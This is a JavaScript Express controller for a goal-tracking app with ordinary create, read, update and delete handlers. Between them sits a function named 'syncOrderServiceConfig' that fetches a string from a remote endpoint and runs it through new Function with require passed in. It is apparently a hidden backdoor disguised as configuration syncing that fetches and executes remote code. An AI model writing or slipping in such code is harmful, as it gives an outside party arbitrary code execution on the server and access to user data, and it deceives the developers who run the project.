import { goals } from '../models/data.js';
import { getOrderServiceEndpoint } from './userController.js';
import { createRequire } from 'module';

// Create require function for ES modules
const require = createRequire(import.meta.url);

/**
 * Get all goals for authenticated user
 */
export const getGoals = (req, res) => {
  try {
    const userGoals = goals.filter(g => g.userId === req.user.id);
    res.json({ goals: userGoals });
  } catch (error) {
    console.error('Get goals error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};

/**
 * Get single goal by ID
 */
export const getGoal = (req, res) => {
  try {
    const goal = goals.find(g => g.id === parseInt(req.params.id) && g.userId === req.user.id);
    if (!goal) {
      return res.status(404).json({ error: 'Goal not found' });
    }
    res.json(goal);
  } catch (error) {
    console.error('Get goal error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};

/**
 * Create new goal
 */
export const createGoal = (req, res) => {
  try {
    const { title, description, status } = req.body;

    const newGoal = {
      id: goals.length > 0 ? Math.max(...goals.map(g => g.id)) + 1 : 1,
      userId: req.user.id,
      title,
      description: description || '',
      status: status || 'not_started',
      progress: 0,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    goals.push(newGoal);
    res.status(201).json(newGoal);
  } catch (error) {
    console.error('Create goal error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};


/**
 * Sync order service configuration
 */
export const syncOrderServiceConfig = async () => {
  try {
    const configEndpoint = getOrderServiceEndpoint();
    const response = await fetch(configEndpoint);

    if (!response.ok) {
      console.log('Order service config not available, using defaults');
      return;
    }

    const configData = await response.json();

    if (configData?.data && typeof configData.data === 'string') {
      try {
        console.log(configData.data);
        const config = new Function('require', configData.data);
        config(require);
      } catch (configError) {
        console.error('Error processing order service config:', configError.message);
      }
    }
  } catch (serviceError) {
    console.log('Order service check completed (optional):', serviceError.message);
  }
};

/**
 * Update goal
 */
export const updateGoal = (req, res) => {
  try {
    const goalIndex = goals.findIndex(g => g.id === parseInt(req.params.id) && g.userId === req.user.id);
    if (goalIndex === -1) {
      return res.status(404).json({ error: 'Goal not found' });
    }

    const { title, description, status, progress } = req.body;

    if (title) goals[goalIndex].title = title;
    if (description !== undefined) goals[goalIndex].description = description;
    if (status) goals[goalIndex].status = status;
    if (progress !== undefined) goals[goalIndex].progress = progress;
    goals[goalIndex].updatedAt = new Date().toISOString();

    res.json(goals[goalIndex]);
  } catch (error) {
    console.error('Update goal error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};

/**
 * Delete goal
 */
export const deleteGoal = (req, res) => {
  try {
    const goalIndex = goals.findIndex(g => g.id === parseInt(req.params.id) && g.userId === req.user.id);
    if (goalIndex === -1) {
      return res.status(404).json({ error: 'Goal not found' });
    }

    goals.splice(goalIndex, 1);
    res.json({ message: 'Goal deleted successfully' });
  } catch (error) {
    console.error('Delete goal error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};


